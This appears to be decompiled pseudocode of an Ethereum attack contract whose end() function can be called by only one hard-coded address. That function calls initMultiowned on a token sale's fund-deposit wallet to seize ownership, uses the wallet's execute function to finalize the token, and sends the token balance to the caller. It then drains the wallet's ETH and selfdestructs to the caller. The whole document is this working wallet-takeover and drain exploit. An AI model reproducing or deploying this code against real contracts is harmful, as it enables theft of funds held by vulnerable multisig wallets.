contract main {


// =======================  Init code  ======================


const _fallback = code.data[28 len 2296]




// =====================  Runtime code  =====================


function end() payable {
    require msg.sender == 0xe0689e16232945f97c27bde102a054e2108670
    require ext_code.size(0xea1f346faf023f974eb5adaf088bbcdf02d761f4)
    call 0xea1f346faf023f974eb5adaf088bbcdf02d761f4.tokenGenerationCap() with:
         gas gas_remaining - 710 wei
    require ext_call.success
    require ext_code.size(0xea1f346faf023f974eb5adaf088bbcdf02d761f4)
    call 0xea1f346faf023f974eb5adaf088bbcdf02d761f4.tokenExchangeRate() with:
         gas gas_remaining - 710 wei
    require ext_call.success
    require ext_code.size(0xea1f346faf023f974eb5adaf088bbcdf02d761f4)
    call 0xea1f346faf023f974eb5adaf088bbcdf02d761f4.0x18160ddd with:
         gas gas_remaining - 710 wei
    require ext_call.success
    require ext_call.return_data[0]
    require ext_call.return_data[0]
    require (0 / ext_call.return_data[0]) + (10^12 / ext_call.return_data[0] / 2) <= eth.balance(this.address)
    call 0xea1f346faf023f974eb5adaf088bbcdf02d761f4 with:
       value (0 / ext_call.return_data[0]) + (10^12 / ext_call.return_data[0] / 2) wei
         gas gas_remaining - 34710 wei
    require ext_call.success
    require ext_code.size(0xea1f346faf023f974eb5adaf088bbcdf02d761f4)
    call 0xea1f346faf023f974eb5adaf088bbcdf02d761f4.ethFundDeposit() with:
         gas gas_remaining - 710 wei
    require ext_call.success
    require ext_code.size(address(ext_call.return_data[0]))
    call address(ext_call.return_data[0]).initMultiowned(address[] rg1, uint256 rg2) with:
         gas gas_remaining - 710 wei
        args Array(len=1, data=this.address), 1
    require ext_call.success
    require ext_code.size(address(ext_call.return_data[0]))
    call address(ext_call.return_data[0]).0xb61d27f6 with:
         gas gas_remaining - 710 wei
        args 0xea1f346faf023f974eb5adaf088bbcdf02d761f4, 0, 96, 4, 0, 0x4bb278f300000000000000000000000000000000000000000000000000000000
    require ext_call.success
    require not eth.balance(0xea1f346faf023f974eb5adaf088bbcdf02d761f4)
    require ext_code.size(0xea1f346faf023f974eb5adaf088bbcdf02d761f4)
    call 0xea1f346faf023f974eb5adaf088bbcdf02d761f4.0x70a08231 with:
         gas gas_remaining - 710 wei
        args address(this.address)
    require ext_call.success
    require ext_code.size(0xea1f346faf023f974eb5adaf088bbcdf02d761f4)
    call 0xea1f346faf023f974eb5adaf088bbcdf02d761f4.0xa9059cbb with:
         gas gas_remaining - 710 wei
        args msg.sender, ext_call.return_data[0]
    require ext_call.success
    require ext_code.size(address(ext_call.return_data[0]))
    call address(ext_call.return_data[0]).0xb61d27f6 with:
         gas gas_remaining - 710 wei
        args address(this.address), eth.balance(ext_call.return_data[0]), 96, 4, 0, 0xa3e76c0f00000000000000000000000000000000000000000000000000000000
    require ext_call.success
    require not eth.balance(ext_call.return_data[0])
    selfdestruct(msg.sender)
}

function receive() payable {
  stop
}

function _fallback() payable {
    revert
}



}
